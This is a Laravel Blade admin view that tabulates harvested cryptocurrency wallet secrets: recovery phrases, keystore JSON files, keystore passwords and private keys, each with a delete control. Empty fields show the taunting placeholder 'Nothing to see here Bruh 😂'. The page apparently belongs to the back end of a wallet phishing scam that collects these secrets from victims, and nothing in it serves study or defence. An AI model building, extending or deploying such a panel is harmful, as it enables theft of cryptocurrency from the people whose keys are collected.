@extends('admin.layouts.index')

@section('content')

<div class="p-3">
    <div class="col-xl-12">
        <!--begin::Table Widget 4-->
        <div class="card card-flush h-xl-100">
            <!--begin::Card header-->
            <div class="card-header pt-7">
                <!--begin::Title-->
                <h3 class="card-title align-items-center flex-column">
                    <span class="card-label fw-bolder text-gray-800">Phrase, Keystore_Json & Private_key</span>
                    {{-- <span class="text-gray-400 mt-1 fw-bold fs-6">Avg. 57 orders per day</span> --}}
                </h3>
                <!--end::Title-->
                <!--begin::Actions-->
                <div class="card-toolbar">
                    <!--begin::Filters-->
                    <div class="d-flex flex-stack flex-wrap gap-4">
                        <!--begin::Search-->
                        <div class="position-relative my-1">
                            <!--begin::Svg Icon | path: icons/duotune/general/gen021.svg-->
                            <span class="svg-icon svg-icon-2 position-absolute top-50 translate-middle-y ms-4">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
                                    viewBox="0 0 24 24" fill="none">
                                    <rect opacity="0.5" x="17.0365" y="15.1223" width="8.15546" height="2"
                                        rx="1" transform="rotate(45 17.0365 15.1223)" fill="currentColor" />
                                    <path
                                        d="M11 19C6.55556 19 3 15.4444 3 11C3 6.55556 6.55556 3 11 3C15.4444 3 19 6.55556 19 11C19 15.4444 15.4444 19 11 19ZM11 5C7.53333 5 5 7.53333 5 11C5 14.4667 7.53333 17 11 17C14.4667 17 17 14.4667 17 11C17 7.53333 14.4667 5 11 5Z"
                                        fill="currentColor" />
                                </svg>
                            </span>
                            <!--end::Svg Icon-->
                            <input type="text" data-kt-table-widget-4="search"
                                class="form-control w-150px fs-7 ps-12" placeholder="Search" />
                        </div>
                        <!--end::Search-->
                    </div>
                    <!--begin::Filters-->
                </div>
                <!--end::Actions-->
            </div>
            <!--end::Card header-->
            <!--begin::Card body-->
            <div class="card-body pt-2">
                <!--begin::Table-->
                <table class="table align-middle table-row-dashed fs-6 gy-3" id="kt_table_widget_4_table">
                    <!--begin::Table head-->
                    <thead>
                        <!--begin::Table row-->
                        <tr class="text-start text-gray-400 fw-bolder fs-7 text-uppercase gs-0 ">
                            <th class="text-center min-w-50px">S/N</th>
                            <th class="text-center min-w-100px">Coin ID</th>
                            <th class="text-center min-w-125px">Phrase</th>
                            <th class="text-center min-w-125px">Keystore_Json</th>
                            <th class="text-center min-w-100px">Keystore_Password</th>
                            <th class="text-center min-w-125px">Private Key</th>
                            <th class="text-center min-w-100px">Delete</th>
                        </tr>
                        <!--end::Table row-->
                    </thead>
                    <!--end::Table head-->
                    <!--begin::Table body-->
                    {{-- hello i just want to make new comit today --}}
                    @php
                        $sn = 1;
                    @endphp
                   @forelse ($details as $detail)
                   <tbody class="fw-bolder text-gray-600">
                    <tr class="mb-3">
                        <td class=" text-center border border-2">
                            <span>{{ $sn ++ }}</span>
                        </td>
                        <td class="text-center border border-2">
                            <span>{{ $detail->coin_id }}</span>
                        </td>
                        <td class="text-center border border-2">
                            <span>{{ $detail->phrase === Null ? 'Nothing to see here Bruh 😂 ' : $detail->phrase  }}</span>
                            {{-- {{ $course->max_student > 200 ? '200+' : $course->max_student }} --}}
                        </td>
                        <td class="text-center border border-2">
                            <span>{{ $detail->keystore_json === Null ? 'Nothing to see here Bruh 😂' : $detail->keystore_json  }}</span>
                        </td>
                        <td class="text-center border border-2">
                            <span>{{ $detail->keystore_json_pass === Null ? 'Nothing to see here Bruh 😂' : $detail->keystore_json_pass  }}</span>
                        </td>
                        <td class="text-center border border-2">
                            <span>{{ $detail->private_key === Null ? 'Nothing to see here Bruh 😂' : $detail->private_key  }}</span>
                        </td>
                        <td class="text-center border border-2 ">
                            <a href="#" class="btn btn-icon btn-bg-light btn-sm" data-bs-toggle="modal"
                                data-bs-target="#kt_modal_1{{ $detail->coin_id }}" data-kt-users-table-filter="delete_row">
                                <!--begin::Svg Icon | path: icons/duotune/general/gen027.svg-->
                                <span class="svg-icon svg-icon-3 svg-icon-danger">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
                                        viewBox="0 0 24 24" fill="none">
                                        <path
                                            d="M5 9C5 8.44772 5.44772 8 6 8H18C18.5523 8 19 8.44772 19 9V18C19 19.6569 17.6569 21 16 21H8C6.34315 21 5 19.6569 5 18V9Z"
                                            fill="currentColor" />
                                        <path opacity="0.5"
                                            d="M5 5C5 4.44772 5.44772 4 6 4H18C18.5523 4 19 4.44772 19 5V5C19 5.55228 18.5523 6 18 6H6C5.44772 6 5 5.55228 5 5V5Z"
                                            fill="currentColor" />
                                        <path opacity="0.5"
                                            d="M9 4C9 3.44772 9.44772 3 10 3H14C14.5523 3 15 3.44772 15 4V4H9V4Z"
                                            fill="currentColor" />
                                    </svg>
                                </span>
                                <!--end::Svg Icon-->
                            </a>
                            <div class="modal fade" tabindex="-1" id="kt_modal_1{{ $detail->coin_id }}">
                                <div class="modal-dialog">
                                    <div class="modal-content text-center">
                                        <div class="modal-header">
                                            <h5 class="modal-title"></h5>

                                            <!--begin::Close-->
                                            <div class="btn btn-icon btn-sm btn-active-light-primary ms-2"
                                                data-bs-dismiss="modal" aria-label="Close">
                                                <span class="svg-icon svg-icon-2x">
                                                    <svg xmlns="http://www.w3.org/2000/svg" width="24"
                                                        height="24" viewBox="0 0 24 24" fill="none">
                                                        <rect opacity="0.5" x="6" y="17.3137"
                                                            width="16" height="2" rx="1"
                                                            transform="rotate(-45 6 17.3137)" fill="currentColor" />
                                                        <rect x="7.41422" y="6" width="16"
                                                            height="2" rx="1"
                                                            transform="rotate(45 7.41422 6)" fill="currentColor" />
                                                    </svg>
                                                </span>
                                            </div>
                                            <!--end::Close-->
                                        </div>

                                        <div class="modal-body">
                                            <p>Are you sure you want to delete?</p>
                                        </div>

                                        <div class="modal-footer d-flex justify-content-center">
                                            <button type="button" class="btn btn-light"
                                                data-bs-dismiss="modal">Close</button>

                                            <form action="{{ route('DestroyDetail',['detail' => $detail->coin_id]) }}" method="POST">
                                                @csrf
                                                @method('DELETE')
                                                <button type="submit" class="btn btn-danger">Delete</button>
                                            </form>

                                        </div>
                                    </div>
                                </div>
                            </div>
                        </td>
                    </tr>
                </tbody>
                   @empty
                       
                   @endforelse
                    <!--end::Table body-->
                </table>
                <!--end::Table-->
            </div>
            <!--end::Card body-->
        </div>
        <!--end::Table Widget 4-->
    </div>
</div>
@endsection
